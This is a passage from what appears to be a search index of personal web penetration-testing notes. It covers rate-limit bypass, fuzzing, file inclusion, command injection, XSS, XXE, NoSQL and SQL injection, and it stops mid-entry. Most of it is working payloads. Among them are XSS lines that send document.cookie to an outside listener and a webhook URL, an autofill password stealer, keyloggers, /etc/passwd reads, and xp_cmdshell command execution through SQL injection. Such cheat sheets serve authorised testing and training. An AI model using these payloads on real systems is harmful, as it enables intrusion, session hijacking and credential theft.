<li>HTTP verb tamperng?</li> <li>Decrease amount and speed of requests?</li> </ul> <p>Quick win headers: <pre><code>X-Real-IP:\nX-Forwarded-For:\nX-Originating-IP:\nClient-IP:\nTrue-Client-IP:\n</code></pre> 1st, get yourself rate limited, then send a request with these headers, check bypass <pre><code>POST / HTTP/2\nHost: jacobh.io\nSec-Ch-Ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nX-Real-IP: 1.2.3.4\nX-Forwarded-For: 1.2.3.4\nX-Originating-IP: 1.2.3.4\nClient-IP: 1.2.3.4\nTrue-Client-IP: 1.2.3.4\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> Also try localhost <pre><code>X-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/","title":"Session Tokens","text":"<p>Determine if a token warrents further investigation</p> <ul> <li>send multiple requests with valid login to login endpoint<ul> <li>Do tokens change?</li> <li>Is any part of the token static? </li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/#burp-sequencer","title":"Burp Sequencer","text":"<ul> <li>Sequencer will allow you to request many tokens and automatically assess their entropy. </li> <li>Sequencer identifies some patterns in a token, we should spend time investigating that token further.</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Discovery/Directory%20Fuzzing/","title":"Directory Fuzzing","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Discovery/Directory%20Fuzzing/#directory-fuzzing","title":"Directory Fuzzing","text":"<p>ffuf <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -recursion\n</code></pre> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u &lt;URL&gt;/FUZZ -fc 200\n</code></pre> dirb <pre><code>dirb &lt;URL&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <pre><code>dirb &lt;URL&gt; -X .html\n</code></pre> feroxbuster <pre><code>feroxbuster -u http://example.com -x php,html,htm,asp,aspx\n</code></pre> dirsearch <pre><code>dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://example.com\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Discovery/Google%20Dorks/","title":"Google Dorks","text":"<p>Dorks <pre><code>site:site.com filetype:pdf\n</code></pre> - crt.sh - search through certificates <pre><code>%.site.com\n</code></pre> Asset finder: https://github.com/tomnomnom/assetfinder <pre><code>assetfinder &lt;DOMAIN&gt;\n</code></pre> <pre><code>assetfinder &lt;DOMAIN&gt; | grep &lt;DOMAIN&gt; | sort -u\n</code></pre> amass <pre><code>amass enum -d &lt;DOMAIN&gt;\n</code></pre> httpprobe <pre><code>cat &lt;SUBDOMAINSLIST&gt; | grep &lt;domain&gt; | sort -u | httpprobe -prefer-https | grep https\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Discovery/Parameter%20Fuzzing/","title":"Parameter Fuzzing","text":"<p>GET <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key\n</code></pre> Then filter for size <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php?FUZZ=key -fs &lt;size&gt;\n</code></pre> POST <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u https://example.com/administration/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs &lt;size filter&gt;\n</code></pre></p> <p>note</p> <p>Tip: In PHP, \"POST\" data \"content-type\" can only accept \"application/x-www-form-urlencoded\". So, we can set that in \"ffuf\" with -H</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/","title":"Filter Bypasses","text":"<p>Things to consider:</p> <ul> <li>Are filters applied recursively ?</li> <li>Insufficient character blacklist</li> <li>Not using allow lists</li> <li>Can it properly handle encoded payloads?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/#basic","title":"Basic","text":"<p>Non-recursive filter bypass <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd\n</code></pre> Mangle capitals &amp; operators for filter bypasses <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd\n</code></pre> Play with the characters, determine if certain characters are being stripped out, you may be able to abuse the order at which chars are stripped out. for example: if <code>$</code> is being filtered out at the last step of the process, you may be able to split your payload with that characters, with it being reconstructed post filter. <pre><code>/.$./.$./.$./etc/passwd\n</code></pre> becomes: <pre><code>/../../../etc/passwd\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/#php-wrappers","title":"PHP Wrappers","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md</p> <ul> <li>Leak php code instead of executing it. <pre><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre></li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/","title":"Local File Inclusion (LFI)","text":"<p>note</p> <p>Try to exploit 1st by replacing the expected value, then by appending your payload after the expected value. If you see a path <code>/var/www/images/5.jpg</code> we may need to insert our payload not at the root, but instead of 5.jpg - the application may be expecting the preceding path to exist in the request. </p> <p>List of payloads</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</p> <p>ffuf - Copy request to file via burp <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n</code></pre> Filter by wordcount <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20\n</code></pre></p> <p>List of most common LFI parameters <pre><code>?cat={payload}\n?dir={payload]\n?action={payload}\n?board={payload}\n?date={payload}\n?detail={payload}\n?file={payload}\n?download={payload}\n?path={payload}\n?folder={payload}\n?prefix={payload}\n?include={payload}\n?page={payload]\n?inc={payload}\n?locate={payload}\n?show={payload}\n?doc={payload}\n?site={payload}\n?type={payload}\n?view={payload}\n?content={payload}\n?document={payload}\n?layout={payload}\n?mod={payload}\n?conf={payload}\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/","title":"Command Injection","text":"<p>https://book.hacktricks.xyz/pentesting-web/command-injection Payloads <pre><code>; whoami\n</code></pre> <pre><code>; whoami ;\n</code></pre> <pre><code>; whoami ; #\n</code></pre> Close logic via our controlled input, then execute <pre><code> awk 'BEGIN {print sqrt(((-2)^2) + ((-3)^2))}'\n</code></pre> <pre><code>3)^2))}';whoami;#\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/#blind","title":"Blind","text":"<p><pre><code>http://LOCALIP&gt;:PORT/?=`whoami`\n</code></pre> Response on listening server: <pre><code>HEAD /?=www-data HTTP/1.1\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/","title":"Cross Site Scripting (XSS)","text":"<p>https://appsecexplained.gitbook.io/appsecexplained/common-vulns/javascript-injection-xss/xss-methodology</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#identify","title":"Identify","text":"<p>Are we able to control any data that is being reflected back and rendered by the application?</p> <p>Important considerations:</p> <ul> <li>Where is the payload executing?</li> <li>What input validation exists?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#htlm-tag-context","title":"HTLM Tag Context","text":"<p>If we have control over content that is being reflected in an html tag. You can try to close the tag and exec <pre><code>\"&gt;&lt;script&gt;prompt(1)&lt;/script&gt;\n\"&gt;&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> If you have control over an <code>href</code> you can try the javascript browser scheme <pre><code>http://example.com --&gt; javascript:prompt()\n</code></pre> Or just close tag early <pre><code>&lt;/selected&gt;&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#javascript-context","title":"Javascript context","text":"<p>If we have control over content that is being reflected into a javascript context. Example: <pre><code>var querySearch = 'controlledInput'\n</code></pre> Break the quote by appending input and comment out trailing semicolon. <pre><code>controlledInput';prompt()//';\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#general","title":"General","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#quickly-test-for-unfiltered-tags","title":"Quickly test for unfiltered tags","text":"<ol> <li>Get a list of tags (copy to clipboard https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)</li> <li>Intercept request with burp, send to intruder. </li> <li>Paste the tags into the payloads. </li> <li>Start attack, monitor for unfiltered response codes, different length responses, etc...</li> <li>You've hopefully found an unfiltered tag.</li> <li>You can append portions of the payloads to determine exactly what is triggering the block.</li> <li>Copy the events from portswigger, do the same thing for the event portion of the payload.</li> </ol> <p>Test html injection first, usually this is a good indicator (JS = you might need to bypass filter) <pre><code>&lt;h1&gt;test&lt;/h1&gt;\n</code></pre> Payloads <pre><code>&lt;script&gt;alert()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;print()&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;prompt(\"string\")&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;\n</code></pre> <pre><code> &lt;plaintext&gt;\n</code></pre></p> <p>info</p> <p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on</p> <p>You need to trigger XSS if not executed on page load <pre><code>&lt;img src=x onerror=\"prompt(1)\"&gt;\n</code></pre> Redirect <pre><code>&lt;img src=x onerror=\"window.location.href='&lt;https://example.com&gt;'\"&gt;\n</code></pre> script tag filter <pre><code>&lt;img src=x onerror=print()&gt;\n</code></pre> <pre><code>&lt;scri&lt;script&gt;pt&gt;prompt(1)&lt;scri&lt;/scr&lt;/script&gt;ipt&gt;\n</code></pre> Keylogger <pre><code>function logKey(event){console.log(event.key)}\n</code></pre> <pre><code> document.addEventListener('keydown', logKey)\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#dom-xss","title":"DOM XSS","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#identify_1","title":"Identify","text":"<p>You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS if we look at the page source by hitting <code>CTRL+U</code>, we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button We can still view the rendered page source with the Web Inspector tool by clicking <code>CTRL+SHIFT+C</code>:</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#stored","title":"Stored","text":"<p>Steal admin cookie (classic) <pre><code>&lt;script&gt;fetch(\"&lt;http://192.168.187.130:9999/&gt;\" + document.cookie)&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;var i = new Image; i.src=\"https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?\"+document.cookie;&lt;/script&gt;\n</code></pre></p> <p>note</p> <p>Sometimes you may need to trigger the payload with JS as well (JS to resize the screen when using an onresize event to trigger)</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#automated-with-dom-invader","title":"Automated with DOM Invader","text":"<p>Turn DOM invader on via the burp extension. Open dev tools,click DOM Invader tab. Input the provided canary to potential execution. DOM Invader will identify sources and sinks for that data.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#note-on-cors","title":"Note on CORS","text":"<p>CORS policy will not block data exfil, only the REPONSES from non-allowlisted domains are blocked. The request will still be made, (to your webhook etc) just pass the <code>mode: 'no-cors'</code></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#extending-xss","title":"Extending XSS","text":"<p>Steal cookies <pre><code>&lt;img src=\"http://localhost?c='+document.cookie+'\" /&gt; fetch(\"http://localhost?c=\"+document.cookie);\n</code></pre> Accessing local &amp; session storage <pre><code>let localStorageData = JSON.stringify(localStorage) let sessionStorageData = JSON.stringify(sessionStorage)\n</code></pre> Autofill stealer <pre><code>// create the input elements\nlet usernameField = document.createElement(\"input\")\nusernameField.type = \"text\"\nusernameField.name = \"username\"\nusernameField.id = \"username\"\nlet passwordField = document.createElement(\"input\")\npasswordField.type = \"password\"\npasswordField.name = \"password\"\npasswordField.id = \"password\"\n// append the elements to the body of the page\ndocument.body.appendChild(usernameField)\ndocument.body.appendChild(passwordField)\n// exfiltrate as needed (we need to wait for the fields to be\nfilled before exfiltrating the information)\nsetTimeout(function() {\nconsole.log(\"Username:\",\ndocument.getElementById(\"username\").value)\nconsole.log(\"Password:\",\ndocument.getElementById(\"password\").value)\n</code></pre></p> <p>Session Riding <pre><code>let xhr = new XMLHttpRequest();\nxhr.open('POST','http://localhost/updateprofile',true);\nxhr.setRequestHeader('Content-type','application/x-www-form-\nurlencoded');\nxhr.send('email=updated@email.com (mailto:updated@email.com)\u2019);\n</code></pre> Keylogging <pre><code>Keylogging\ndocument.onkeypress = function(e) {\nget = window.event ? event : e\nkey = get.keyCode ? get.keyCode : get.charCode\nkey = String.fromCharCode(key)\nconsole.log(key)\n}\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Cross-Site%20Scripting%20%28XSS%29/#xss-filter-evasion","title":"XSS Filter Evasion","text":"<p>OWASP cheat sheet is pretty good https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/","title":"External Entity Injection (XXE)","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p> <p>Check:</p> <ul> <li>XXE if an application references XML formatted data.</li> <li>If you think an endpoint is only accepting JSON, try to switch to XML and check if the application still accepts it.</li> <li>SVG uploads (try even if the form says png only)</li> <li>DOCX uploads</li> </ul> <p>Potential impact</p> <ul> <li>View files on target server</li> <li>SSRF</li> <li>Exfiltrate Data</li> </ul> <p>Basic payload - file inclusion</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (\\#ANY)&gt;\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;data&gt;&amp;file;&lt;/data&gt;\n</code></pre> <p>Ensure you\u2019re following the applications expected format</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE creds [\n&lt;!ELEMENT creds ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/creds&gt;\n</code></pre> <p>File Upload Intercept image upload, change content type header, and file extension to svg <pre><code>Content-Type: image/svg+xml\n</code></pre> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg </p> <p>Via XInclude Request is sending data in payload, we can potentially replace the data with XInclude to achieve file inclusion Payload <pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre> </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/","title":"NoSQL Injection","text":"<p>SQL but without tables. MongoDB is most popular.  more common, with <code>MongoDB</code> now being the 5th most used database engine (as of November 2022). The way <code>NoSQL</code> databases store data varies significantly across the different categories and implementations.</p> Type Description Top 3 Engines (as of November 2022) Document-Oriented Database Stores data in <code>documents</code> which contain pairs of <code>fields</code> and <code>values</code>. These documents are typically encoded in formats such as <code>JSON</code> or <code>XML</code>. MongoDB, Amazon DynamoDB, Google Firebase - Cloud Firestore Key-Value Database A data structure that stores data in <code>key:value</code> pairs, also known as a <code>dictionary</code>. Redis, Amazon DynamoDB, Azure Cosmos DB Wide-Column Store Used for storing enormous amounts of data in <code>tables</code>, <code>rows</code>, and <code>columns</code> like a relational database, but with the ability to handle more ambiguous data types. Apache Cassandra, Apache HBase, Azure Cosmos DB Graph Database Stores data in <code>nodes</code> and uses <code>edges</code> to define relationships. Neo4j, Azure Cosmos DB, Virtuoso"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/#mongodb","title":"MongoDB","text":"<p>MongoDB Usage cheatsheet: https://www.mongodb.com/developer/products/mongodb/cheat-sheet/#connect-mongodb-shell</p> <p>Mongo uses query operators to interact and compare fields. Here are some examples: query operators.</p> Type Operator Description Example Comparison <code>$eq</code> Matches values which are <code>equal to</code> a specified value <code>type: {$eq: \"Pink Lady\"}</code> Comparison <code>$gt</code> Matches values which are <code>greater than</code> a specified value <code>price: {$gt: 0.30}</code> Comparison <code>$gte</code> Matches values which are <code>greater than or equal to</code> a specified value <code>price: {$gte: 0.50}</code> Comparison <code>$in</code> Matches values which exist <code>in the specified array</code> <code>type: {$in: [\"Granny Smith\", \"Pink Lady\"]}</code> Comparison <code>$lt</code> Matches values which are <code>less than</code> a specified value <code>price: {$lt: 0.60}</code> Logical <code>$not</code> Matches documents which <code>do not meet the conditions</code> of a specified query <code>type: {$not: {$eq: \"Granny Smith\"}}</code> Evaluation <code>$regex</code> Matches values which <code>match a specified RegEx</code> <code>type: {$regex: /^G.*/}</code>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/#basic-injection-example","title":"Basic Injection Example","text":"<p>Auth Bypass Normal data: <pre><code>email=test@test.com&amp;password=test\n</code></pre> Becomes: <pre><code>email[$ne]=test@test.com&amp;password[$ne]=test\n</code></pre>  This will evaluate to TRUE (unless the values actually exist) and bypass auth. OR match anything and always eval to true: <pre><code>email[$regex]=.*&amp;password[$regex]=.*\n</code></pre> Data Extraction Ways can match ALL data from an injection point and return it: - <code>name: {$ne: 'doesntExist'}</code>: Assuming <code>doesntExist</code> doesn't match any documents' names, this will match all documents. - <code>name: {$gt: ''}</code>: This matches all documents whose name is 'bigger' than an empty string. - <code>name: {$gte: ''}</code>: This matches all documents whose name is 'bigger or equal to' an empty string. - <code>name: {$lt: '~'}</code>: This compares the first character of <code>name</code> to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters. - <code>name: {$lte: '~'}</code>: Same logic as above, except it additionally matches documents whose names start with <code>~</code>.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/#server-side-javascript-injection","title":"Server-Side JavaScript Injection","text":"<p>Execute arbitrary JavaScript in the context of the database. Auth bypass  we could set <code>username</code> to <code>\" || true || \"\"==\"</code>, which should result in the query statement always returning <code>True</code>, regardless of what <code>this.username</code> and <code>this.password</code> are. </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/","title":"SQL Injection","text":"<p>note</p> <p>Think outside the box for injectable parameters. Anything that could be passed to a db is worth testing against. ie UAs, cookies, etc\u2026</p> <p>note</p> <p>when fuzzing for SQL injection, try 1. replacing valid data with payloads, 2. appending payloads to the end of valid data</p> <p>note</p> <p>Be very careful with SQL injection payloads, likely potential for DOS, ask for permission if you find something.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#key-delimiters-and-enclosures","title":"Key Delimiters and Enclosures","text":"<ul> <li><code>'</code>, <code>\"</code>: Standard string delimiters. E.g., <code>' OR '1'='1</code></li> <li><code>\\\\: MySQL identifier quoting. E.g.,</code> column <code>= 'value'</code> `</li> <li><code>;</code>: Statement separator. E.g., <code>SELECT * FROM users; DROP TABLE users;</code></li> <li><code>-</code>, <code>/*...*/</code>: SQL comments. E.g., <code>-comment</code>, <code>/* comment */</code></li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#injection-patterns","title":"Injection Patterns","text":"<ul> <li>Basic Injection: <code>' OR 1=1--</code></li> <li>Closing Brackets: Try closing out functions or statements. E.g., <code>')</code>, <code>'))</code>, <code>')))--</code>, <code>%'))-- -</code></li> <li>Logical Operators: <code>OR</code>, <code>AND</code>. E.g., <code>' OR 'x'='x</code></li> <li>Union Injection: <code>' UNION SELECT ... --</code></li> <li>Conditional Time Delays (for blind SQLi):<ul> <li>MySQL: <code>'; SELECT SLEEP(5);--</code></li> <li>MSSQL: <code>'; WAITFOR DELAY '00:00:05';--</code></li> <li>Oracle: <code>'; dbms_lock.sleep(5);--</code></li> <li>PostgreSQL: <code>'; SELECT pg_sleep(5);--</code></li> </ul> </li> <li>Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#enumerate-db-type","title":"Enumerate DB Type","text":"<p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p> <p>PostgreSQL:     <code>SELECT pg_sleep(10)</code> MySQL:  <code>SELECT SLEEP(10)</code> Oracle:     <code>dbms_pipe.receive_message(('a'),10)</code> Microsoft:  <code>WAITFOR DELAY '0:0:10'</code></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#automated","title":"Automated","text":"<p>See SQLMap cheat sheet</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#cheat-sheet-per-db-type","title":"Cheat Sheet Per DB Type","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#basic","title":"Basic","text":"<p>Logical or <pre><code>' OR 1=1-- -\n</code></pre> Union - Enum number of columns <pre><code>' union select null#\n' union select null,null#\n' union select null,null,null#\n</code></pre> Now that you know number of columns, return any query results <pre><code>' union select null,null,version()#\n</code></pre> <pre><code>' union select null,null,table_name from information_schema.tables#\n</code></pre> <pre><code>' union select null,null,&lt;COLUMN&gt; from &lt;TABLE&gt;#\n</code></pre> Column types must match in union select. <pre><code>' union select null(int),1,null,null from &lt;table&gt;#\n</code></pre> https://portswigger.net/web-security/sql-injection/cheat-sheet</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#blind","title":"Blind","text":"<p>manual logical value extraction - Compare results against passed char, if response does not change, we have a valid char <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 1) = '7'#\n</code></pre> <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 2) = '7.'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 3) = '7.0'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 5) = '7.0.3'#\n</code></pre> sqlmap <pre><code>sqlmap -r r --level=2\n</code></pre> <pre><code>sqlmap -r r --level=2 --dump\n</code></pre> <pre><code>sqlmap -r r --level=2 -T &lt;TABLENAME&gt; --dump\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#second-order","title":"Second-order","text":"<p>Injection achieved when query is executed not at the injection point, but when the query is retrieved. - Signup endpoint, you signup with the user <code>' or 1=1-- -</code> and the query only returns data when you navigate to the \u201caccounts\u201d page after your user is created.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#mssql","title":"MSSQL","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases","title":"List databases","text":"<p>Normal <pre><code>Select name from sys.databases\n</code></pre> Error based <pre><code>cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM master..sysdatabases --\n</code></pre> Stacked Queries <pre><code>; SELECT name FROM master..sysdatabases; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables","title":"List Tables:","text":"<p>Normal <pre><code>select * from app.information_schema.tables;\n</code></pre> Error based` <pre><code>cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --\n</code></pre> Stacked Queries <pre><code>; SELECT * FROM information_schema.tables; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns","title":"List columns","text":"<p>Normal <pre><code>select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';\n</code></pre> Error based <pre><code>cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)\n</code></pre> Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#command-execution","title":"Command Execution","text":"<p>Normal</p> <p>To use <code>xp_cmdshell</code> for command execution, it first needs to be enabled by a user with administrative privileges: <pre><code>EXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n</code></pre> After enabling, you can execute system commands like so: <pre><code>EXEC xp_cmdshell 'your_command_here';\n</code></pre></p> <p>SQLi Just like before, you will need to enable the privs first, sometimes they may be enabled by default: <pre><code>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --\n</code></pre> <pre><code>'; EXEC xp_cmdshell 'your_command_here'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#mysql","title":"MYSQL","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_1","title":"List databases","text":"<p>Normal <pre><code>SHOW DATABASES;\n</code></pre></p> <p>Error based (32 character limit) <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--\n</code></pre> Union Based <pre><code>' UNION SELECT schema_name, NULL FROM information_schema.schemata --\n</code></pre> Stacked Queries: <pre><code>; SHOW DATABASES; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_1","title":"List Tables","text":"<p>Normal <pre><code>SHOW TABLES;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW TABLES; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_1","title":"List columns","text":"<p>Normal <pre><code>SHOW COLUMNS FROM table_name;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' 